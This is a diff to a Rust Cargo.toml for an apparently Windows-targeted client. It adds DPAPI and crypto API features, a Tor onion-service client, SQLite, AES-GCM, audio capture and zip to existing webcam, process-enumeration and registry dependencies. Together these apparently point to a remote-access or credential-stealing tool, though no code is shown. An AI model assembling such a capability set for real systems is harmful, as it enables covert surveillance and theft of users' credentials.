@@ -4,7 +4,7 @@ version = "0.1.0"
 edition = "2021"
 
 [dependencies]
-winapi = { version = "0.3.9", features = ["libloaderapi", "tlhelp32", "utilapiset", "errhandlingapi", "dxgi1_2", "winerror", "synchapi", "securitybaseapi", "winuser", "wincon","shellapi", "oleauto"] }
+winapi = { version = "0.3.9", features = ["libloaderapi", "tlhelp32", "utilapiset", "errhandlingapi", "dxgi1_2", "winerror", "synchapi", "securitybaseapi", "winuser", "wincon","shellapi", "oleauto", "dpapi", "wincrypt", "wingdi", "winbase", "processthreadsapi", "handleapi"] }
 sysinfo = { version = "0.35.0", default-features = false, features = ["system", "disk"] }
 common = { path = "../common" }
 rmp-serde = "1.3.0"
@@ -17,5 +17,19 @@ wmi = "0.17.1"
 serde = { version = "1.0", features = ["derive"] }
 nokhwa = { version = "0.10.7", features = ["input-native"] }
 socket2 = "0.5"
-image = { version = "0.24", default-features = false, features = ["jpeg", "png"] }
+image = { version = "0.25", default-features = false, features = ["jpeg", "png"] }
 winreg = "0.55.0"
+arti-client = { version = "0.42.0", features = ["tokio", "rustls", "onion-service-client"] }
+tor-rtcompat = { version = "0.42.0", features = ["tokio", "rustls"] }
+tracing = "0.1"
+tracing-subscriber = { version = "0.3", features = ["env-filter", "fmt"] }
+futures = "0.3"
+rusqlite = { version = "0.36.0", features = ["bundled"] }
+aes-gcm = "0.10.3"
+base64 = "0.22.1"
+serde_json = "1.0"
+reqwest = { version = "0.12", default-features = false, features = ["json", "rustls-tls"] }
+regex = "1.11"
+cpal = "0.15"
+zip = "0.6"
+libloading = "0.8"
